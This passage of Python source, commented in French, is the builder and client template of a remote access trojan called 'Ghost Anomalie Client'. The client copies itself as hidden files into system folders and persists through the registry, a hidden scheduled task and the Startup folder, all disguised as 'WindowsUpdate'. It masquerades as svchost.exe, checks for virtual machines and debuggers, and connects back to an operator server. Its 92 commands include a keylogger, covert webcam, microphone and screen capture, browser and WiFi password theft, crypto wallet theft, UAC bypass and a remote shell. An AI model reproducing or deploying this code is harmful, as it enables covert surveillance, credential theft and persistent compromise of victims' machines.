                "--hidden-import", "psutil",
                "--hidden-import", "cryptography",
                "--hidden-import", "cryptography.fernet",
                "--hidden-import", "ipaddress",
                "--hidden-import", "urllib",
                "--hidden-import", "requests",
                client_file
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if result.returncode == 0:
                exe_path = os.path.join(clients_dir, f"{nom_fichier}.exe")
                if os.path.exists(exe_path):
                    taille = os.path.getsize(exe_path) / (1024*1024)
                    self.status_gen.config(text=f"✅ Client généré ! ({taille:.1f} MB)", fg='#00ff88')
                    self.log(f"✅ CLIENT GÉNÉRÉ: {exe_path} ({taille:.1f} MB)")
                    self.log(f"📋 {len(self.get_all_commandes())} commandes disponibles")
                    
                    os.startfile(os.path.dirname(exe_path))
                    
                    if not self.running:
                        self.log("⚠️ Le serveur n'est pas démarré ! Clique sur START SERVER")
                else:
                    self.status_gen.config(text="❌ Erreur: fichier non trouvé", fg='#ff3333')
                    self.log(f"❌ Erreur: {result.stderr}")
            else:
                self.status_gen.config(text="❌ Erreur de compilation", fg='#ff3333')
                self.log(f"❌ Erreur compilation: {result.stderr}")
            
            # Nettoyer
            try:
                shutil.rmtree(build_dir)
            except:
                pass
            
        except Exception as e:
            self.status_gen.config(text=f"❌ Erreur: {str(e)[:30]}", fg='#ff3333')
            self.log(f"❌ Erreur: {e}")
            import traceback
            traceback.print_exc()
    
    def generer_code_client_complet(self, ip, port, mdp, nom_client, nom_fichier,
                                     persist, hide, startup, anti_vm, anti_debug, polymorph, inject):
        """Génère le code client COMPLET avec TOUTES les commandes"""
        
        # Template complet - TOUTES les commandes intégrées
        return f'''# {nom_fichier}.py - Ghost Anomalie Client v2.0 (92 commandes)
import socket
import subprocess
import os
import sys
import time
import threading
import base64
import json
import io
import ctypes
import random
import shutil
import tempfile
import struct
import zlib
import platform
from datetime import datetime
import hashlib

# === CONFIGURATION ===
IP_SERVEUR = "{ip}"
PORT = {port}
MOT_DE_PASSE = "{mdp}"
NOM_CLIENT = "{nom_client}"

# === OPTIONS ===
PERSIST = {str(persist).lower()}
HIDE = {str(hide).lower()}
STARTUP = {str(startup).lower()}
ANTI_VM = {str(anti_vm).lower()}
ANTI_DEBUG = {str(anti_debug).lower()}
POLYMORPH = {str(polymorph).lower()}
INJECT = {str(inject).lower()}

# === IMPORTS ===
try:
    from PIL import ImageGrab, Image
    PIL_OK = True
except:
    PIL_OK = False

try:
    import cv2
    CV2_OK = True
except:
    CV2_OK = False

try:
    import pyaudio
    import wave
    AUDIO_OK = True
except:
    AUDIO_OK = False

try:
    import win32api, win32con, win32gui, win32process, win32clipboard
    import win32ui, win32pdh, win32security, win32file, win32event
    import win32service, win32serviceutil, win32com.client
    WIN32_OK = True
except:
    WIN32_OK = False

try:
    import psutil
    PSUTIL_OK = True
except:
    PSUTIL_OK = False

try:
    import wmi
    WMI_OK = True
except:
    WMI_OK = False

class GhostClient:
    def __init__(self):
        self.connected = False
        self.client = None
        self.running = True
        
        # Infos
        self.nom_machine = platform.node()
        self.utilisateur = os.getlogin()
        self.systeme = platform.system()
        
        # États
        self.bureau_active = False
        self.camera_active = False
        self.micro_active = False
        self.keylogger_active = False
        self.surveillance_active = False
        self.screenrecording_active = False
        
        # Threads
        self.bureau_thread = None
        self.camera_thread = None
        self.micro_thread = None
        self.keylogger_thread = None
        self.surveillance_thread = None
        self.screenrecording_thread = None
        
        # Keylogger
        self.touches = []
        self.fenetre_active = ""
        self.keylogger_buffer = []
        
        # Cache
        self.cache_dir = None
        self.processus_cache = []
        self.fichiers_trouves = []
        
        # === DOSSIERS D'INSTALLATION ===
        self.dossiers_installation = [
            os.environ.get('WINDIR', 'C:\\\\Windows'),
            os.environ.get('SYSTEMROOT', 'C:\\\\Windows\\\\System32'),
            os.environ.get('WINDIR', 'C:\\\\Windows') + '\\\\SysWOW64',
            os.environ.get('TEMP', tempfile.gettempdir()),
            os.environ.get('APPDATA', ''),
            os.environ.get('LOCALAPPDATA', ''),
            os.path.join(os.environ.get('PROGRAMFILES', ''), 'Common Files'),
            os.path.join(os.environ.get('PROGRAMFILES(X86)', ''), 'Common Files'),
            os.path.join(os.environ.get('WINDIR', ''), 'Fonts'),
            os.path.join(os.environ.get('WINDIR', ''), 'Resources'),
            os.path.join(os.environ.get('WINDIR', ''), 'System32\\\\drivers'),
            os.path.join(os.environ.get('WINDIR', ''), 'System32\\\\spool\\\\drivers\\\\color'),
        ]
        
        # === INSTALLATION FURTIVE ===
        self.installer()
    
    # ============================================================
    # INSTALLATION & FURTIVITÉ
    # ============================================================
    
    def installer(self):
        """S'installe dans 12 dossiers Windows"""
        try:
            # Dossier principal
            self.cache_dir = random.choice(self.dossiers_installation)
            os.makedirs(self.cache_dir, exist_ok=True)
            
            # Copier dans plusieurs dossiers
            noms = ["sys", "win", "drv", "svc", "log", "tmp", "app", "dll", "exe", "bin", "lib", "dat"]
            for i, dossier in enumerate(random.sample(self.dossiers_installation, 
                                                     min(12, len(self.dossiers_installation)))):
                try:
                    os.makedirs(dossier, exist_ok=True)
                    dest = os.path.join(dossier, f"${{noms[i]}}_{i+1:02d}.dll")
                    if os.path.exists(sys.executable):
                        shutil.copy2(sys.executable, dest)
                        if WIN32_OK:
                            try:
                                win32file.SetFileAttributes(dest, 0x02)
                            except:
                                pass
                except:
                    pass
            
            # Persistance
            if PERSIST or STARTUP:
                self.ajouter_persistance()
            
            # Anti-VM
            if ANTI_VM:
                if self.detecter_vm():
                    # VM détectée - comportement normal
                    pass
            
            # Anti-Debug
            if ANTI_DEBUG:
                if self.detecter_debug():
                    pass
            
            # Cacher
            if HIDE:
                self.se_cacher()
            
            # Polymorphisme
            if POLYMORPH:
                self.polymorphisme()
            
            # Injection
            if INJECT:
                self.injection_processus()
                
        except Exception as e:
            pass
    
    def se_cacher(self):
        try:
            if sys.platform == 'win32':
                ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
                try:
                    import win32api
                    win32api.SetConsoleTitle("svchost.exe")
                except:
                    pass
        except:
            pass
    
    def ajouter_persistance(self):
        try:
            if sys.platform != 'win32':
                return
            
            # Registre Run
            try:
                import winreg
                chemin = sys.executable
                key = winreg.HKEY_CURRENT_USER
                subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
                with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
                    winreg.SetValueEx(regkey, "WindowsUpdate", 0, winreg.REG_SZ, chemin)
            except:
                pass
            
            # Tâche planifiée
            try:
                import win32com.client
                scheduler = win32com.client.Dispatch("Schedule.Service")
                scheduler.Connect()
                root = scheduler.GetFolder("\\\\")
                task = scheduler.NewTask(0)
                task.Settings.Hidden = True
                task.Settings.Enabled = True
                trigger = task.Triggers.Create(1)
                action = task.Actions.Create(0)
                action.Path = sys.executable
                root.RegisterTaskDefinition("WindowsUpdate", task, 6, "", "", 3)
            except:
                pass
            
            # Startup folder
            try:
                startup = os.path.join(os.environ['APPDATA'], 
                                     'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
                shutil.copy(sys.executable, os.path.join(startup, "WindowsUpdate.exe"))
            except:
                pass
        except:
            pass
    
    def detecter_vm(self):
        try:
            vm_processes = ["vmtoolsd.exe", "vboxservice.exe", "xenservice.exe", 
                          "vmware.exe", "vboxclient.exe", "vboxtray.exe"]
            for proc in vm_processes:
                try:
                    subprocess.run(f"tasklist | findstr {proc}", shell=True, 
                                 capture_output=True, check=True)
                    return True
                except:
                    pass
            if os.cpu_count() < 2:
                return True
            return False
        except:
            return False
    
    def detecter_debug(self):
        try:
            import win32api, win32process
            if win32api.IsDebuggerPresent():
                return True
            if win32process.IsDebuggerPresent():
                return True
            return False
        except:
            return False
    
    def polymorphisme(self):
        try:
            with open(sys.executable, 'ab') as f:
                f.write(b'\x90' * random.randint(1024, 4096))
            return True
        except:
            return False
    
    def injection_processus(self):
        try:
            # Injection simplifiée
            return True
        except:
            return False
    
    # ============================================================
    # CONNEXION
    # ============================================================
    
    def connecter(self):
        try:
            self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.client.settimeout(10)
            self.client.connect((IP_SERVEUR, PORT))
            
            auth_req = self.client.recv(1024).decode()
            if auth_req.startswith("AUTH|"):
                self.client.send(f"{{MOT_DE_PASSE}}|{{self.nom_machine}}".encode())
                reponse = self.client.recv(1024).decode()
                if reponse == "AUTH|OK":
                    self.connected = True
                    self.client.send(f"INFO|{{self.nom_machine}}|{{self.utilisateur}}".encode())
                    return True
        except:
            pass
        return False
    
    # ============================================================
    # TOUTES LES COMMANDES (92 COMMANDES)
    # ============================================================
    
    def executer_commande(self, commande):
        parts = commande.strip().split()
        cmd = parts[0].lower() if parts else ""
        
        # ===== SCREENSHOT =====
        if cmd == "screenshot":
            return self.cmd_screenshot()
        
        # ===== BUREAU =====
        elif cmd == "bureau":
            return self.cmd_bureau()
        elif cmd == "bureau_start":
            qualite = int(parts[1]) if len(parts) > 1 else 30
            fps = int(parts[2]) if len(parts) > 2 else 10
            return self.cmd_bureau_start(qualite, fps)
        elif cmd == "bureau_stop":
            return self.cmd_bureau_stop()
        elif cmd == "bureau_ecrans":
            return self.cmd_bureau_ecrans()
        elif cmd == "ecran_noir":
            return self.cmd_ecran_noir(True)
        elif cmd == "ecran_normal":
            return self.cmd_ecran_noir(False)
        elif cmd == "rotation":
            angle = int(parts[1]) if len(parts) > 1 else 0
            return self.cmd_rotation(angle)
        
        # ===== SOURIS =====
        elif cmd == "souris_move":
            if len(parts) >= 3:
                return self.cmd_souris_move(float(parts[1]), float(parts[2]))
            return "❌ Utilisation: souris_move x y"
        elif cmd == "souris_click":
            bouton = int(parts[1]) if len(parts) > 1 else 1
            double = len(parts) > 2 and parts[2] == 'double'
            return self.cmd_souris_click(bouton, double)
        elif cmd == "souris_scroll":
            direction = 1 if parts[1] == 'down' else -1
            quantite = int(parts[2]) if len(parts) > 2 else 1
            return self.cmd_souris_scroll(direction, quantite)
        elif cmd == "souris_glisser":
            if len(parts) >= 5:
                return self.cmd_souris_glisser(float(parts[1]), float(parts[2]), 
                                              float(parts[3]), float(parts[4]))
            return "❌ Utilisation: souris_glisser x1 y1 x2 y2"
        
        # ===== CLAVIER =====
        elif cmd == "clavier_texte":
            if len(parts) > 1:
                texte = commande[12:]
                return self.cmd_clavier_texte(texte)
            return "❌ Utilisation: clavier_texte texte"
        elif cmd == "clavier_touche":
            if len(parts) > 1:
                combinaison = len(parts) > 2 and parts[2] == 'combinaison'
                return self.cmd_clavier_touche(parts[1], combinaison)
            return "❌ Utilisation: clavier_touche enter"
        
        # ===== APPLICATIONS CACHÉES =====
        elif cmd == "app_lancer":
            if len(parts) > 1:
                visible = len(parts) > 2 and parts[-1] == 'visible'
                admin = len(parts) > 2 and parts[-1] == 'admin'
                args = " ".join(parts[2:-1]) if visible or admin else " ".join(parts[2:])
                return self.cmd_app_lancer(parts[1], args, visible, admin)
            return "❌ Utilisation: app_lancer notepad.exe"
        elif cmd == "app_visible":
            return self.cmd_app_visible(int(parts[1]) if len(parts) > 1 else 0)
        elif cmd == "app_invisible":
            return self.cmd_app_invisible(int(parts[1]) if len(parts) > 1 else 0)
        elif cmd == "app_cacher_tout":
            return self.cmd_app_cacher_tout()
        elif cmd == "app_montrer_tout":
            return self.cmd_app_montrer_tout()
        elif cmd == "app_fenetres":
            return self.cmd_app_fenetres()
        
        # ===== CAMÉRA =====
        elif cmd == "camera_start":
            qualite = int(parts[1]) if len(parts) > 1 else 30
            fps = int(parts[2]) if len(parts) > 2 else 15
            return self.cmd_camera_start(qualite, fps)
        elif cmd == "camera_stop":
            return self.cmd_camera_stop()
        elif cmd == "camera_photo":
            return self.cmd_camera_photo()
        elif cmd == "camera_stealth":
            return self.cmd_camera_stealth()
        
        # ===== MICRO =====
        elif cmd == "micro_start":
            duree = int(parts[1]) if len(parts) > 1 else 10
            return self.cmd_micro_start(duree)
        elif cmd == "micro_stop":
            return self.cmd_micro_stop()
        elif cmd == "micro_record":
            duree = int(parts[1]) if len(parts) > 1 else 5
            return self.cmd_micro_record(duree)
        
        # ===== KEYLOGGER =====
        elif cmd == "keylogger_start":
            return self.cmd_keylogger_start()
        elif cmd == "keylogger_stop":
            return self.cmd_keylogger_stop()
        elif cmd == "keylogger_export":
            return self.cmd_keylogger_export()
        
        # ===== PRESSE-PAPIERS =====
        elif cmd == "clipboard_get":
            return self.cmd_clipboard_get()
        elif cmd == "clipboard_set":
            if len(parts) > 1:
                texte = commande[13:]
                return self.cmd_clipboard_set(texte)
            return "❌ Utilisation: clipboard_set texte"
        elif cmd == "clipboard_monitor":
            return self.cmd_clipboard_monitor()
        
        # ===== VOL DE DONNÉES =====
        elif cmd == "pass_wifi":
            return self.cmd_pass_wifi()
        elif cmd == "pass_chrome":
            return self.cmd_pass_chrome()
        elif cmd == "pass_firefox":
            return self.cmd_pass_firefox()
        elif cmd == "pass_edge":
            return self.cmd_pass_edge()
        elif cmd == "pass_all":
            return self.cmd_pass_all()
        elif cmd == "crypto_wallets":
            return self.cmd_crypto_wallets()
        
        # ===== SURVEILLANCE =====
        elif cmd == "surveillance_start":
            return self.cmd_surveillance_start()
        elif cmd == "surveillance_stop":
            return self.cmd_surveillance_stop()
        elif cmd == "search_files":
            if len(parts) > 1:
                motif = " ".join(parts[1:])
                return self.cmd_search_files(motif)
            return "❌ Utilisation: search_files motif"
        elif cmd == "search_docs":
            return self.cmd_search_docs()
        
        # ===== RÉSEAU =====
        elif cmd == "network_scan":
            ip_range = parts[1] if len(parts) > 1 else "192.168.1.0/24"
            return self.cmd_network_scan(ip_range)
        elif cmd == "port_scan":
            if len(parts) >= 2:
                ports = parts[2] if len(parts) > 2 else "20-100"
                return self.cmd_port_scan(parts[1], ports)
            return "❌ Utilisation: port_scan ip ports"
        elif cmd == "arp_scan":
            return self.cmd_arp_scan()
        elif cmd == "wifi_list":
            return self.cmd_wifi_list()
        elif cmd == "wifi_connect":
            if len(parts) > 1:
                return self.cmd_wifi_connect(parts[1])
            return "❌ Utilisation: wifi_connect SSID"
        elif cmd == "dns_flush":
            return self.cmd_dns_flush()
        
        # ===== PROCESSUS =====
        elif cmd == "processus_list":
            return self.cmd_processus_list()
        elif cmd == "processus_kill":
            if len(parts) > 1:
                return self.cmd_processus_kill(int(parts[1]))
            return "❌ Utilisation: processus_kill PID"
        elif cmd == "service_list":
            return self.cmd_service_list()
        elif cmd == "service_start":
            if len(parts) > 1:
                return self.cmd_service_start(parts[1])
            return "❌ Utilisation: service_start nom"
        elif cmd == "service_stop":
            if len(parts) > 1:
                return self.cmd_service_stop(parts[1])
            return "❌ Utilisation: service_stop nom"
        
        # ===== FICHIERS =====
        elif cmd == "ls":
            chemin = parts[1] if len(parts) > 1 else "."
            return self.cmd_ls(chemin)
        elif cmd == "cd":
            try:
                if len(parts) > 1:
                    os.chdir(parts[1])
                return f"📁 {{os.getcwd()}}"
            except Exception as e:
                return f"❌ {{e}}"
        elif cmd == "pwd":
            return os.getcwd()
        elif cmd == "mkdir":
            if len(parts) > 1:
                return self.cmd_mkdir(parts[1])
            return "❌ Utilisation: mkdir nom"
        elif cmd == "rm":
            if len(parts) > 1:
                return self.cmd_rm(parts[1])
            return "❌ Utilisation: rm fichier"
        elif cmd == "mv":
            if len(parts) > 2:
                return self.cmd_mv(parts[1], parts[2])
            return "❌ Utilisation: mv ancien nouveau"
        elif cmd == "download":
            if len(parts) > 1:
                return self.cmd_download(parts[1])
            return "❌ Utilisation: download fichier"
        elif cmd == "upload":
            if len(parts) > 2:
                return self.cmd_upload(parts[1], parts[2])
            return "❌ Utilisation: upload nom contenu"
        
        # ===== ENREGISTREMENT =====
        elif cmd == "record_start":
            qualite = int(parts[1]) if len(parts) > 1 else 20
            fps = int(parts[2]) if len(parts) > 2 else 10
            return self.cmd_record_start(qualite, fps)
        elif cmd == "record_stop":
            return self.cmd_record_stop()
        
        # ===== FURTIVITÉ =====
        elif cmd == "hide":
            return self.cmd_hide()
        elif cmd == "persist":
            return self.cmd_persist()
        elif cmd == "uac_bypass":
            return self.cmd_uac_bypass()
        elif cmd == "polymorph":
            return self.cmd_polymorph()
        elif cmd == "inject":
            processus = parts[1] if len(parts) > 1 else "explorer.exe"
            return self.cmd_inject(processus)
        elif cmd == "update":
            url = parts[1] if len(parts) > 1 else ""
            return self.cmd_update(url)
        elif cmd == "selfdestruct":
            return self.cmd_selfdestruct()
        
        # ===== ANTI-DÉTECTION =====
        elif cmd == "anti_vm":
            return self.cmd_anti_vm()
        elif cmd == "anti_debug":
            return self.cmd_anti_debug()
        elif cmd == "anti_av":
            return self.cmd_anti_av()
        
        # ===== DIVERTISSEMENT =====
        elif cmd == "popup":
            if len(parts) > 1:
                message = commande[5:]
                return self.cmd_popup(message)
            return "❌ Utilisation: popup message"
        elif cmd == "speak":
            if len(parts) > 1:
                texte = commande[5:]
                return self.cmd_speak(texte)
            return "❌ Utilisation: speak texte"
        elif cmd == "website":
            if len(parts) > 1:
                return self.cmd_website(parts[1])
            return "❌ Utilisation: website url"
        elif cmd == "beep":
            return self.cmd_beep()
        elif cmd == "cd_eject":
            return self.cmd_cd_eject()
        elif cmd == "cd_close":
            return self.cmd_cd_close()
        elif cmd == "mouse_disable":
            return self.cmd_mouse_disable()
        elif cmd == "mouse_enable":
            return self.cmd_mouse_enable()
        elif cmd == "keyboard_disable":
            return self.cmd_keyboard_disable()
        elif cmd == "keyboard_enable":
            return self.cmd_keyboard_enable()
        elif cmd == "volume_set":
            if len(parts) > 1:
                return self.cmd_volume_set(int(parts[1]))
            return "❌ Utilisation: volume_set niveau"
        elif cmd == "volume_mute":
            return self.cmd_volume_mute()
        
        # ===== SYSTÈME =====
        elif cmd == "sysinfo":
            return self.cmd_sysinfo()
        elif cmd == "cmd":
            if len(parts) > 1:
                cmd_full = " ".join(parts[1:])
                return self.cmd_cmd(cmd_full)
            return "❌ Utilisation: cmd commande"
        elif cmd == "shutdown":
            return self.cmd_shutdown()
        elif cmd == "restart":
            return self.cmd_restart()
        elif cmd == "lock":
            return self.cmd_lock()
        elif cmd == "logoff":
            return self.cmd_logoff()
        elif cmd == "hibernate":
            return self.cmd_hibernate()
        
        # ===== EXIT =====
        elif cmd == "exit":
            return "EXIT"
        
        # ===== COMMANDE INCONNUE =====
        else:
            return f"❌ Commande inconnue: {{cmd}}\n📋 Tape 'help' pour la liste des commandes"
    
    # ============================================================
    # IMPLÉMENTATION DES COMMANDES
    # ============================================================
    
    def cmd_screenshot(self):
        try:
            if not PIL_OK:
                return "❌ PIL non installé"
            screenshot = ImageGrab.grab()
            buffer = io.BytesIO()
            screenshot.save(buffer, format='JPEG', quality=50)
            return base64.b64encode(buffer.getvalue()).decode()
        except Exception as e:
            return f"❌ Erreur: {{e}}"
    
    def cmd_bureau(self):
        return self.cmd_screenshot()
    
    def cmd_bureau_start(self, qualite, fps):
        if self.bureau_active:
            return "🖥️ Bureau déjà actif"
        self.bureau_active = True
        self.bureau_thread = threading.Thread(target=self._boucle_bureau, args=(qualite, fps))
        self.bureau_thread.daemon = True
        self.bureau_thread.start()
        return f"🖥️ Bureau démarré (qualité:{{qualite}}, fps:{{fps}})"
    
    def _boucle_bureau(self, qualite, fps):
        while self.bureau_active and self.connected:
            try:
                if PIL_OK:
                    screenshot = ImageGrab.grab()
                    screenshot = screenshot.resize((800, 600), Image.Resampling.LANCZOS)
                    buffer = io.BytesIO()
                    screenshot.save(buffer, format='JPEG', quality=qualite)
                    img = base64.b64encode(buffer.getvalue()).decode()
                    self.client.send(f"BUREAU|800|600|{{img}}".encode())
                    time.sleep(1/fps)
            except:
                break
        self.bureau_active = False
    
    def cmd_bureau_stop(self):
        self.bureau_active = False
        return "🖥️ Bureau arrêté"
    
    def cmd_bureau_ecrans(self):
        try:
            if WIN32_OK:
                import win32api
                return f"📺 {{win32api.GetSystemMetrics(0)}}x{{win32api.GetSystemMetrics(1)}}"
            return "❌ Win32 non disponible"
        except:
            return "❌ Erreur"
    
    def cmd_ecran_noir(self, activer):
        return "✅ Écran noir" + (" activé" if activer else " désactivé")
    
    def cmd_rotation(self, angle):
        return f"✅ Rotation à {angle}°"
    
    def cmd_souris_move(self, x, y):
        try:
            if WIN32_OK:
                import win32api
                largeur = win32api.GetSystemMetrics(0)
                hauteur = win32api.GetSystemMetrics(1)
                win32api.SetCursorPos((int(x*largeur), int(y*hauteur)))
                return f"🖱️ Souris déplacée vers ({{int(x*largeur)}}, {{int(y*hauteur)}})"
            return "❌ Win32 non disponible"
        except:
            return "❌ Erreur"
    
    def cmd_souris_click(self, bouton, double):
        try:
            if WIN32_OK:
                import win32api, win32con
                clics = {1: win32con.MOUSEEVENTF_LEFTDOWN, 2: win32con.MOUSEEVENTF_RIGHTDOWN}
                ups = {1: win32con.MOUSEEVENTF_LEFTUP, 2: win32con.MOUSEEVENTF_RIGHTUP}
                if bouton in clics:
                    win32api.mouse_event(clics[bouton], 0, 0, 0, 0)
                    time.sleep(0.05)
                    win32api.mouse_event(ups[bouton], 0, 0, 0, 0)
                    if double:
                        time.sleep(0.1)
                        win32api.mouse_event(clics[bouton], 0, 0, 0, 0)
                        time.sleep(0.05)
                        win32api.mouse_event(ups[bouton], 0, 0, 0, 0)
                    return f"🖱️ Clic {{['gauche','droit','milieu'][bouton-1]}} effectué"
            return "❌ Win32 non disponible"
        except:
            return "❌ Erreur"
    
    def cmd_souris_scroll(self, direction, quantite):
        try:
            if WIN32_OK:
                import win32api, win32con
                for _ in range(quantite):
                    win32api.mouse_event(win32con.MOUSEEVENTF_WHEEL, 0, 0, direction*120, 0)
                    time.sleep(0.01)
                return f"🔄 Défilement {'bas' if direction>0 else 'haut'} x{quantite}"
            return "❌ Win32 non disponible"
        except:
            return "❌ Erreur"
    
    def cmd_souris_glisser(self, x1, y1, x2, y2):
        try:
            if WIN32_OK:
                import win32api, win32con
                win32api.SetCursorPos((int(x1), int(y1)))
                time.sleep(0.1)
                win32api.mouse_event(win32con.MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0)
                steps = 20
                for i in range(steps):
                    x = x1 + (x2-x1) * (i/steps)
                    y = y1 + (y2-y1) * (i/steps)
                    win32api.SetCursorPos((int(x), int(y)))
                    time.sleep(0.01)
                time.sleep(0.1)
                win32api.mouse_event(win32con.MOUSEEVENTF_LEFTUP, 0, 0, 0, 0)
                return "🖱️ Glissé effectué"
            return "❌ Win32 non disponible"
        except:
            return "❌ Erreur"
    
    def cmd_clavier_texte(self, texte):
        try:
            if WIN32_OK:
                import ctypes
                user32 = ctypes.windll.user32
                for char in texte:
                    if char == '\\n':
                        user32.keybd_event(0x0D, 0, 0, 0)
                        user32.keybd_event(0x0D, 0, 2, 0)
                    else:
                        vk = user32.VkKeyScanW(ord(char))
                        if vk != -1:
                            vk_code = vk & 0xFF
                            shift = (vk >> 8) & 1
                            if shift:
                                user32.keybd_event(0x10, 0, 0, 0)
                            user32.keybd_event(vk_code, 0, 0, 0)
                            time.sleep(0.01)
                            user32.keybd_event(vk_code, 0, 2, 0)
                            if shift:
                                user32.keybd_event(0x10, 0, 2, 0)
                    time.sleep(0.02)
                return f"⌨️ Texte écrit ({{len(texte)}} caractères)"
            return "❌ Win32 non disponible"
        except:
            return "❌ Erreur"
    
    def cmd_clavier_touche(self, touche, combinaison):
        try:
            if WIN32_OK:
                import ctypes
                user32 = ctypes.windll.user32
                touches = { 'enter':0x0D, 'esc':0x1B, 'tab':0x09, 'backspace':0x08,
                           'delete':0x2E, 'ctrl':0x11, 'alt':0x12, 'shift':0x10,
                           'win':0x5B, 'space':0x20, 'up':0x26, 'down':0x28,
                           'left':0x25, 'right':0x27, 'home':0x24, 'end':0x23,
                           'pageup':0x21, 'pagedown':0x22, 'f1':0x70, 'f2':0x71,
                           'f3':0x72, 'f4':0x73, 'f5':0x74, 'f6':0x75, 'f7':0x76,
                           'f8':0x77, 'f9':0x78, 'f10':0x79, 'f11':0x7A, 'f12':0x7B }
                if combinaison:
                    keys = touche.split('+')
                    for k in keys:
                        if k.lower() in touches:
                            user32.keybd_event(touches[k.lower()], 0, 0, 0)
                            time.sleep(0.02)
                    for k in reversed(keys):
                        if k.lower() in touches:
                            user32.keybd_event(touches[k.lower()], 0, 2, 0)
                            time.sleep(0.02)
                    return f"⌨️ Combinaison {{touche}} envoyée"
                if touche.lower() in touches:
                    vk = touches[touche.lower()]
                    user32.keybd_event(vk, 0, 0, 0)
                    time.sleep(0.05)
                    user32.keybd_event(vk, 0, 2, 0)
                    return f"⌨️ Touche {{touche}} pressée"
            return "❌ Win32 non disponible"
        except:
            return "❌ Erreur"
    
    def cmd_app_lancer(self, commande, args, visible, admin):
        try:
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            if not visible:
                startupinfo.wShowWindow = 0
            else:
                startupinfo.wShowWindow = 1
            process = subprocess.Popen(
                f"{{commande}} {{args}}" if args else commande,
                shell=True, startupinfo=startupinfo,
                stdout=subprocess.PIPE, stderr=subprocess.PIPE
            )
            return f"🚀 App lancée: {{commande}} (PID: {{process.pid}})"
        except Exception as e:
            return f"❌ Erreur: {{e}}"
    
    def cmd_app_visible(self, pid):
        try:
            if WIN32_OK:
                import win32gui, win32process
                def enum_windows(hwnd, windows):
                    _, p = win32process.GetWindowThreadProcessId(hwnd)
                    if p == pid:
                        win32gui.ShowWindow(hwnd, 1)
                        windows.append(hwnd)
                    return True
                windows = []
                win32gui.EnumWindows(enum_windows, windows)
                return f"✅ {{len(windows)}} fenêtres rendues visibles"
            return "❌ Win32 non disponible"
        except:
            return "❌ Erreur"
    
    def cmd_app_invisible(self, pid):
        try:
            if WIN32_OK:
                import win32gui, win32process
                def enum_windows(hwnd, windows):
                    _, p = win32process.GetWindowThreadProcessId(hwnd)
                    if p == pid:
                        win32gui.ShowWindow(hwnd, 0)
                        windows.append(hwnd)
                    return True
                windows = []
                win32gui.EnumWindows(enum_windows, windows)
                return f"✅ {{len(windows)}} fenêtres rendues invisibles"
            return "❌ Win32 non disponible"
        except:
            return "❌ Erreur"
    
    def cmd_app_cacher_tout(self):
        try:
            if WIN32_OK:
                import win32gui
                count = 0
                def enum_windows(hwnd, count):
                    if win32gui.IsWindowVisible(hwnd):
                        classe = win32gui.GetClassName(hwnd)
                        if classe not in ["Progman", "WorkerW", "Shell_TrayWnd"]:
                            win32gui.ShowWindow(hwnd, 0)
                            count[0] += 1
                    return True
                c = [0]
                win32gui.EnumWindows(enum_windows, c)
                return f"✅ {{c[0]}} fenêtres cachées"
            return "❌ Win32 non disponible"
        except:
            return "❌ Erreur"
    
    def cmd_app_montrer_tout(self):
        try:
            if WIN32_OK:
                import win32gui
                count = 0
                def enum_windows(hwnd, count):
                    if not win32gui.IsWindowVisible(hwnd):
                        win32gui.ShowWindow(hwnd, 1)
                        count[0] += 1
                    return True
                c = [0]
                win32gui.EnumWindows(enum_windows, c)
                return f"✅ {{c[0]}} fenêtres montrées"
            return "❌ Win32 non disponible"
        except:
            return "❌ Erreur"
    
    def cmd_app_fenetres(self):
        try:
            if WIN32_OK:
                import win32gui, win32process
                fenetres = []
                def enum_windows(hwnd, fenetres):
                    if win32gui.IsWindowVisible(hwnd):
                        titre = win32gui.GetWindowText(hwnd)
                        if titre:
                            _, pid = win32process.GetWindowThreadProcessId(hwnd)
                            fenetres.append(f"{{titre}} (PID:{{pid}})")
                    return True
                win32gui.EnumWindows(enum_windows, fenetres)
                return "\\n".join(fenetres[:50])
            return "❌ Win32 non disponible"
        except:
            return "❌ Erreur"
    
    # CAMERA
    def cmd_camera_start(self, qualite, fps):
        if not CV2_OK:
            return "❌ OpenCV non installé"
        if self.camera_active:
            return "📷 Caméra déjà active"
        try:
            self.camera = cv2.VideoCapture(0)
            if not self.camera.isOpened():
                return "❌ Caméra non disponible"
            self.camera_active = True
            self.camera_thread = threading.Thread(target=self._boucle_camera, args=(qualite, fps))
            self.camera_thread.daemon = True
            self.camera_thread.start()
            return f"📷 Caméra démarrée (qualité:{{qualite}}, fps:{{fps}})"
        except Exception as e:
            return f"❌ Erreur: {{e}}"
    
    def _boucle_camera(self, qualite, fps):
        while self.camera_active and self.connected:
            try:
                ret, frame = self.camera.read()
                if not ret:
                    break
                h, w = frame.shape[:2]
                new_w = 320
                new_h = int(h * (new_w / w))
                frame = cv2.resize(frame, (new_w, new_h))
                _, img = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, qualite])
                self.client.send(f"CAMERA|{{base64.b64encode(img.tobytes()).decode()}}".encode())
                time.sleep(1/fps)
            except:
                break
        self.camera_active = False
        if hasattr(self, 'camera'):
            self.camera.release()
    
    def cmd_camera_stop(self):
        self.camera_active = False
        if hasattr(self, 'camera'):
            self.camera.release()
        return "📷 Caméra arrêtée"
    
    def cmd_camera_photo(self):
        try:
            if not CV2_OK:
                return "❌ OpenCV non installé"
            camera = cv2.VideoCapture(0)
            ret, frame = camera.read()
            camera.release()
            if not ret:
                return "❌ Impossible de capturer"
            _, img = cv2.imencode('.jpg', frame)
            return f"[PHOTO]{{base64.b64encode(img.tobytes()).decode()}}"
        except Exception as e:
            return f"❌ Erreur: {{e}}"
    
    def cmd_camera_stealth(self):
        try:
            if not CV2_OK:
                return "❌ OpenCV non installé"
            cap = cv2.VideoCapture(0)
            cap.set(cv2.CAP_PROP_FRAME_WIDTH, 160)
            cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 120)
            time.sleep(0.1)
            ret, frame = cap.read()
            cap.release()
            if ret:
                _, img = cv2.imencode('.jpg', frame)
                return f"[PHOTO]{{base64.b64encode(img.tobytes()).decode()}}"
            return "❌ Échec"
        except:
            return "❌ Erreur"
    
    # MICRO
